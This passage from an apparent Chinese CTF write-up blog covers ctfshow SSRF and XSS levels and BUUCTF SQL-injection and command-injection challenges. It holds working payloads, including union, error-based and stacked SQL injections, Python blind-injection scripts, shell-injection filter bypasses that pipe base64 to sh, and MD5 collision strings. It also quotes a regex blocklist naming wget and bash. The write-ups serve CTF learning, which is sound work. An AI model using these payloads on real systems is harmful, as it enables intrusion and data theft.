</code></pre><p>然后payload写自己的这个地址就可以了。<br>payload:<a href="http://xxx/a.php">http://xxx/a.php</a></p><p>2、在这个网站注册一个账号<code>http://ceye.io/</code>，然后会给你分配一个域名，修改成如下的内容，第一个随便填，第二个写127.0.0.1</p><img src="/2023/08/23/ssrf(ctfshow)/132206.png" class=""><p>多试几次就可以</p><h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><p>url必须以<code>http://ctf.</code>开头，必须以show结尾。<br>以show结尾比较好办，要么#show，要么?a&#x3D;show这样的都可以。<br>以<code>http://ctf.</code>开头的话，加上一个@127.0.0.1就可以绕过了，这样parse_url解析出来的host是127.0.0.1，考虑到<code>ftp://user[:pass]@ip[:port]/path</code>，因此前面的ctf.会被解析成user。</p><pre><code>url=http://ctf.@127.0.0.1/flag.php#show</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss(ctfshow)</title>
      <link href="/2023/08/16/xss(ctfshow)/"/>
      <url>/2023/08/16/xss(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h3><p>这关没有过滤，但有bot拦截，如果我们直接用</p><pre><code>&lt;script&gt;var x=document.cookie;alert(x);&lt;/script&gt;</code></pre><p>会发现弹出you are not admin，所以我们只能将数据外带</p><p>方式1：xss平台</p><pre><code>https://xsshs.cn/，https://hk.sb/,https://xss.pt/，http://xsscom.com https://xs.sb </code></pre><p>在xss平台创建项目，选择默认模块即可，复制生成的xss代码，复制到题目留言框中，刷新下页面，然后在平台查看项目</p><img src="/2023/08/16/xss(ctfshow)/165449.png" class=""><p>方式二：vps</p>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf</title>
      <link href="/2023/08/03/buuctf/"/>
      <url>/2023/08/03/buuctf/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>这道题测出来是单引号闭合，也没有上面过滤，直接用万能密码就能爆出flag</p><pre><code>payload ?username=admin&#39; or 1=1-- -&amp;password=admin</code></pre><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>对查询点进行fuzz测试发现很多关键字都被过滤了</p><img src="/2023/08/03/buuctf/222647.png" class=""><p>回包长度为500的都是可以正常使用的，这里;没有被过滤，尝试堆叠注入</p><p>首先show tables;</p><img src="/2023/08/03/buuctf/224429.png" class=""><p>然后show columns from Flag;，不行，被过滤了。</p><p>参考别人wp <a href="https://blog.csdn.net/StevenOnesir/article/details/110203051%EF%BC%8C%E6%9C%89%E4%B8%A4%E7%A7%8D%E8%A7%A3%E6%B3%95">https://blog.csdn.net/StevenOnesir/article/details/110203051，有两种解法</a></p><p>解法1：</p><p>输入数字只回显1，输入字母啥也不回显，那么我们应该推出后端代码有 或 结构，而且不直接回显flag，但作为一道题目，from应该是from flag，所以猜测后端代码为：</p><pre><code>select $_POST[&#39;query&#39;] || flag from flag</code></pre><p>所以payload就变的简单：</p><pre><code>*，1</code></pre><p>这里，我们的语句变成了</p><pre><code>select *，1 from flag</code></pre><p>select 1 的意思是建立一个临时列，这个列的列名为1，所有初始值都被设为1。</p><p>解法2：</p><p>通过修改SQL配置将或运算符||设置为连接符</p><pre><code>payload 1;set sql_mode=pipes_as_concat;select 1</code></pre><p>要注意分号隔断了前面的命令，所以要再次添加select!!</p><p>上面的payload等同于</p><pre><code>select concat(1,flag) from Flag</code></pre><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>测出来username有注入点，用单引号闭合。</p><p>测数据库名</p><pre><code>username=-1&#39; union select 1,2,database()-- -&amp;password=admin//库名为geek</code></pre><p>测表名</p><pre><code>username=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39; -- -&amp;password=admin//表名为geekuser,l0ve1ysq1</code></pre><p>两个表里面都有id,uername,password</p><p>最终在l0ve1ysq1表里找到了flag</p><pre><code>username=-1&#39; union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from l0ve1ysq1)-- -&amp;password=admin</code></pre><h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>测出来也是单引号闭合，但用order by 3测试时发现报错时”der 3”，说明or和by被过滤，使用双拼即可绕过，这道题几乎所有关键字都可以用双拼绕过，先查库名：</p><pre><code>?username=-1&#39; uunionnion seselectlect 1,2,database()-- -&amp;password=admin//geek</code></pre><p>再查表明：</p><pre><code>?username=-1&#39; ununionion seselectlect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema=&#39;geek&#39; -- -&amp;password=admin//b4bsql,geekuser</code></pre><p>再查字段：</p><pre><code>username=-1&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39; -- -&amp;password=admin//id,username,password</code></pre><p>最终在b4bsql表里找到了flag</p><pre><code>?username=-1&#39; ununionion seselectlect 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) frfromom b4bsql -- -&amp;password=admin</code></pre><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>搞了一圈发现连()都过滤了，看别人wp才发现源码有个注释：</p><pre><code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5base32解码：c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==base64解码：select * from user where username = &#39;$name&#39;</code></pre><pre><code>Base64和Base32 区别：base64中包含大写字母（A-Z），小写字母（a-z），数字0—9以及+/；base32中只包含大写字母（A-Z）和数字234567</code></pre><p>同时，这一关利用sqli的特性：<strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p><p>所以，如果我们使用联合查询访问，一个真实存在的用户名和一个我们自己编造的密码，就会使虚拟数据混淆admin密码，从而使我们成功登录，得到 flag</p><p>我们这题可以测出有三个列，按照报错回显，可以确定第二个列是username,第三个列是password，那么第一列应该是id，我们尝试构造出：</p><pre><code>name=1&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#&amp;pw=1</code></pre><p>如果你看过这题的源代码就会发现，密码是要于数据库中被md5加密过的密码进行对比的，所以我们第三列的字符串是1的md5值。</p><h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>测试了一下union,空格都被过滤了，试试报错注入，空格用括号代替：</p><pre><code>?username=-1&#39;or(updatexml(1,concat(0x7e,database()),1))%23&amp;password=adminusername=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23&amp;password=admin//geek</code></pre><p>测表名，等号也被过滤了，用like代替</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like&#39;geek&#39;)),1)%23&amp;password=admin//H4rDsq1</code></pre><p>测字段</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like&#39;H4rDsq1&#39;)),1)%23&amp;password=admin//id,username,password</code></pre><p>爆数据</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(concat_ws(0x7e,username,password)))from(H4rDsq1))),1)%23&amp;password=admin//~flag~flag&#123;53f3bd9d-f44f-4ce5-a0</code></pre><p>可以看到，只出来了左半部分，使用right()：</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(right(group_concat(concat_ws(0x7e,username,password)),20))from(H4rDsq1))),1)%23&amp;password=admin//~5-a0c8-2720a6d31213&#125;</code></pre><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>用order by 测出有两列数据，继续union select 1,2时发现爆出了过滤的字符：</p><img src="/2023/08/03/buuctf/155441.png" class=""><p>用extractvalue也只能注出库名</p><p>试试堆叠注入，测库名：</p><pre><code>inject=1&#39;;show databases;</code></pre><img src="/2023/08/03/buuctf/161321.png" class=""><p>测表名：</p><pre><code>?inject=1&#39;;show tables;</code></pre><img src="/2023/08/03/buuctf/161643.png" class=""><p>测字段，如果tableName是纯数字，需要用&#96;包裹：</p><pre><code>?inject=1&#39;;show columns from `1919810931114514`;</code></pre><img src="/2023/08/03/buuctf/170603.png" class=""><p>然后就无能为力，看看大佬wp</p><p><strong>解法一：</strong></p><p>可以看到words表里有两个属性，即两列：id 和data<br>而1919810931114514表里只有一个属性列<br>说明输入框可能查询的就是words表<br>后台sql语句可能为</p><pre><code>select id,data from words where id=</code></pre><p>接下来就是如何获取flag了，思路是把1919810931114514表改名为words表，把属性名flag改为id，然后用1’ or 1&#x3D;1;# 显示flag出来，在这之前当然要先把words表改名为其他</p><pre><code>1&#39;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);#</code></pre><p><strong>解法二：</strong></p><p> 因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：</p><pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><p>关于预编译，可以参考：<a href="https://www.cnblogs.com/geaozhang/p/9891338.html">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p><p><strong>解法三</strong>：</p><p>还是预编译，不过我们可以将sql语句直接进行16进制编码</p><pre><code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</code></pre><p>注：prepare…from…是预处理语句，会进行编码转换。</p><p>​    SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</p><p><strong>解法四：</strong></p><p>此题还可以通过handle直接出答案：</p><pre><code>1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</code></pre><pre><code class="text">打开表：HANDLER 表名 OPEN ;查看数据：HANDLER 表名 READ next;关闭表：HANDLER 表名 READ CLOSE;</code></pre><p>可以参考 <a href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>屏蔽了alter和prepare。还可以使用上一道题的第三种方法。</p><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>这道题输入1和2会输出不同的话，输入其他数字会显示Error Occured When Fetch Result.</p><p>尝试报错注入发现只显示bool(false)，所以我们试试盲注，这道题过滤了空格，用括号可以代替：</p><pre><code>id=if(1=1,1,2)//Hello, glzjin wants a girlfriend.id=if(1=2,1,2)//Do you want to be my girlfriend?</code></pre><p>发现可以用布尔盲注，题目提示了flag在flag表里的flag字段里，直接爆数据：</p><pre><code>id=if(ascii(substr((select(flag)from(flag)),1,1))&gt;1,1,2)</code></pre><p>脚本：</p><pre><code>import requestsif __name__ == &#39;__main__&#39; :    url = &#39;http://bb5603db-211d-4c37-9796-e7a42349e7c8.node4.buuoj.cn:81/index.php&#39;    result = &#39;&#39;    i = 0    while True:        i = i + 1        low = 32        high = 127        while low &lt; high:            mid = (low + high) // 2            payload = f&#39;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&#39;            data = &#123;                &quot;id&quot;:payload            &#125;            r = requests.post(url=url,data=data)            if &#39;Hello&#39; in r.text:                low = mid + 1            else:                high = mid        if low != 32:            result += chr(low)        else:            break        print(result)</code></pre><h3 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h3><p>这道题很坑，在登录框里瞎注了半天，没有头绪，最后看别人wp才知道注入点在那几个按妞的地方</p><p>分别点击那几个按钮你就会发现url里的id会变，这就是注入点，get型注入，而且这道题是数字型注入</p><p>测试了一下发现过滤了空格，#，and，order by，union啥的，所以我们试试用括号和异或来进行代替</p><pre><code>?id=0^(ascii(substr((select(database())),1,1))&gt;2)</code></pre><img src="/2023/08/03/buuctf/172434.png" class=""><p>可以看到返回结果与id&#x3D;1一样，可以成功绕过，基于此，我们可以用脚本进行注入：</p><pre><code class="python">import requestsimport timeif __name__ == &#39;__main__&#39; :    url = &#39;http://cf3b0295-5066-4352-aa2b-51ccb07a38c5.node4.buuoj.cn:81/search.php?id=0^&#39;    result = &#39;&#39;    i = 0    while True:        i = i + 1        low = 32        high = 130        while low &lt; high:            mid = (low + high) // 2            #爆库名            #payload = f&#39;(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;            #爆表名                #payload=f&#39;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;geek&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;            #爆字段            #payload = f&#39;(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;geek&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;            #爆数据           #payload=f&#39;(ascii(substr((select(group_concat(concat_ws(&quot;~&quot;,username,password)))from(F1naI1y)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;                     r = requests.get(url=url+payload)            time.sleep(0.05)            if &#39;others&#39; in r.text:                low = mid + 1            else:                high = mid        if low!=32:            result += chr(low)        else:            break        print(result) </code></pre><p>这里要注意的是time.sleep()，请求过快可能不能响应，需要加点延时。</p><h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>打开后是一个输入框，但输入什么都没反应，用burp抓包：</p><img src="/2023/08/03/buuctf/201609.png" class=""><p>这里面password就是我们用户框中输入得东西。如果通过md5($pass,True)之后返回字符串是’or ‘1的话，形成一个永真条件:select * from ‘admin’ where password&#x3D;’ ‘or ‘6…’</p><p>问题是这里的md5加上参数True后返回的是原始16字符2进制格式</p><p>我们可以通过这个脚本来获得满足我们要求的明文：</p><pre><code>&lt;?php for ($i = 0;;) &#123;  for ($c = 0; $c &lt; 1000000; $c++, $i++)  if (stripos(md5($i, true), &#39;\&#39;or\&#39;&#39;) !== false)   echo &quot;\nmd5($i) = &quot; . md5($i, true) . &quot;\n&quot;; echo &quot;.&quot;;&#125;?&gt;</code></pre><p>这里我们用网上常用的<strong>ffifdyop</strong>，这个字符串经过md5($pass,True)后就是<code>&#39;or &#39;6...</code></p><p>传上去后页面跳转到levels91.php，查看源代码：</p><img src="/2023/08/03/buuctf/205543.png" class=""><p>弱类型比较，第一种方法是找出md5值都是两个0e开头的开头的。原理是php里面在做 &#x3D;&#x3D; 的时候会先把两边的类型转成一样的，因为是0e开头，php会认为它是科学技计数法，而0的多少次方都是0。这样的字符网上有很多</p><pre><code>s878926199as155964671a240610708UYXFLOI</code></pre><p>第二种方法是用数组绕过：</p><pre><code>?a[]=1&amp;b[]=2</code></pre><p>传参后又跳转到levell14.php</p><img src="/2023/08/03/buuctf/210632.png" class=""><p>这里是强类型比较，就只能用数组绕过（&#x3D;&#x3D;&#x3D;要求值和类型都相同，貌似当类型为string时，还要比较字符串是否一摸一样）</p><pre><code>param1[]=1&amp;param2[]=2</code></pre><h1 id="命令执行-rce"><a href="#命令执行-rce" class="headerlink" title="命令执行(rce)"></a>命令执行(rce)</h1><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>先测目录，发现在根目录有flag文件</p><pre><code>target=127.0.0.1;ls ../../../</code></pre><img src="/2023/08/03/buuctf/101305.png" class=""><p>查看文件，爆出flag</p><pre><code>target=127.0.0.1;cat ../../../flag</code></pre><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>进去有个提示&#x2F;?ip，get一下发现和前面一道题差不多</p><p>命令联合执行：</p><pre><code>;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）</code></pre><p>通配符：</p><pre><code>*#匹配全部字符，通配符?#任意一个字符，通配符[]#表示一个范围（正则，通配符）&#123;&#125;#产生一个序列（通配符）</code></pre><p>ls就发现了flag.php和index.php，但测试了一下很多东西都被过滤了，空格只能用$IFS$1绕过，flag也被ban了，我们来尝试一下index.php:</p><img src="/2023/08/03/buuctf/103747.png" class=""><pre><code>总结过滤的特殊字符&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#39; &quot; \ () [] &#123;&#125;  空格&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </code></pre><p>1、变量替换</p><pre><code>?ip=127.0.0.1;b=g;cat$IFS$1fla$b.php//这里的变量替换顺序要注意，不然又被贪婪匹配ban了</code></pre><p>2、变量ab互换传递，绕过字符串匹配，实现拼接</p><pre><code>?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</code></pre><p>3、内联执行</p><pre><code>?ip=127.0.0.1;cat$IFS`ls`?ip=127.0.0.1;cat$IFS$3`ls`</code></pre><p>4、被过滤的bash，用管道+sh替换</p><pre><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  //cat flag.php用base64加密来绕过正则匹配?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash //bash被ban了</code></pre><h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p>这道题只有一个eval($_POST[“Syc”]);，可以直接用蚁剑连接</p><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>这道题目在一开始就是一个空白的单纯页面，但是你经过目录扫描的话就会发现一个.git文件</p><p>{ % asset_img 224106.png%}</p><p>这里是git源码泄露，可以用githack把他搞出来</p><p>得到一个index.php</p><img src="/2023/08/03/buuctf/224448.png" class=""><p>可以看到，第一层正则过滤了伪协议，第二层正则是一直递归，也就是所谓的无参数函数校验，例如它可以匹配到a(b(c()d()))，紧接着 又是一次黑名单过滤，很多的关键字都被ban掉了</p><p>所以这题不能用伪协议，只能用无参数函数形式，且过滤了很多函数</p><p>我们第一步肯定是想知道当前目录之下都有些什么<br>所以要构建如下语句</p><pre><code>&lt;?phpprint_r(scandir(&#39;.&#39;));?&gt;</code></pre><p>但是，它只能允许无参数函数，所以我们就要想办法利用无参数函数将“.”给构造出来。</p><p>payload</p><pre><code>print_r(scandir(current(localeconv())));或highlight_file(next(scandir(pos(localeconv()))));</code></pre><pre><code>localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&quot;.&quot;。pos()或current()函数 输出数组中的当前元素的值。</code></pre><p>可以看到，flag在当前目录下，读flag文件：</p><pre><code>print_r(show_source(array_rand(array_flip(scandir(current(localeconv()))))));//array_flip()又可以将数组中的键和值进行对换//array_rand()函数可以随机读取一个数组键或highlight_file(next(array_reverse(scandir(pos(localeconv())))));//array_reverse() 函数以相反的元素顺序返回数组//next() 输出数组中的当前元素的下一个元素的值</code></pre><h3 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h3><p>打开后显示一个hackme和Cannot modify header information - headers already sent by ……</p><p>抓包也没找到有用的信息，但是可以用dirsearch扫出robots,txt:</p><img src="/2023/08/03/buuctf/192357.png" class=""><p>进入到fAke_f1agggg.php也没找到啥有用的，抓包：</p><img src="/2023/08/03/buuctf/192548.png" class=""><p>发现一个fl4g.php，进入</p><img src="/2023/08/03/buuctf/192742.png" class=""><p>可以改一下编码</p><p>有三层绕过</p><p>1、intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</p><p>这里可以用字符串的整型转换，虽然intval函数可以自动判别0x、0b等等的前缀，但不要忘了我们这里传进去的其实字符串，所以会产生从字符串到数字的转换</p><pre><code>payload ?num=0xABC或num=700e5</code></pre><p>2、$md5&#x3D;$_GET[‘md5’]</p><p>md5弱类型比较</p><pre><code>payload: md5=0e215962017</code></pre><p>3、屏蔽了空格和cat</p><pre><code>payload: get_flag=tac%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></pre><h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>进去之后，发现url里有个img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0，看起来像base64，先解码一下</p><p>MzUzNTM1MmU3MDZlNjc&#x3D;</p><p>再解码一次</p><p>3535352e706e67</p><p>再16进制转字符串</p><p>555.png（这个应该是首页中图片的名称，可能存在文件包含）</p><p>查看源代码，发现有一堆base64编码的字符，试一下base64转图片：</p><img src="/2023/08/03/buuctf/225252.png" class=""><p>就是首页的图片</p><p>试试包含一下index.php</p><p>对index.php先转16进制再进行两次base64编码：</p><p>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p><p>查看源代码然后base64解码：</p><pre><code>&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text/html;charset=utf-8&#39;);$cmd = $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;]))     header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123;    echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;    die(&quot;xixi～ no flag&quot;);&#125; else &#123;    $txt = base64_encode(file_get_contents($file));    echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;        echo `$cmd`;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt;  body&#123;   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>审计代码，发现这里用来强制转化（（String）强制转换，数组被强制转换的结果都为<code>string(5) &quot;Array&quot;</code>），所以要用到强类型绕过</p><p>payload:</p><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>进行url解码后的MD5值相等</p><p>收录一些md5值相等的字符串：</p><pre><code>$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;$data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;</code></pre><p>然后用dir读取目录</p><p>最后用c\at%20flag读取flag（题目虽然用了正则**<code>|\\|\\\\</code>**，但这里这样写造成了反斜杠逃逸）</p><p>这里补充一个md5的知识点</p><h5 id="a-x3D-x3D-md5-a）"><a href="#a-x3D-x3D-md5-a）" class="headerlink" title="$a&#x3D;&#x3D;md5($a）"></a>$a&#x3D;&#x3D;md5($a）</h5><p><code>0e215962017</code> 的 MD5 值是由 <strong>0e</strong> 开头，在 PHP 弱类型比较中相等</p><h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><p>这道题之前做过类似的，考察的是nmap的使用</p><p>先测试127.0.0.1 | ls，发现<code>|</code>被转义了，继续测试了一下发现&amp;、;也都被转义了，所以估计代码里使用了和上次那道题一样的函数<code>escapeshellarg()</code>与<code>escapeshellcmd()</code></p><p>参考：<a 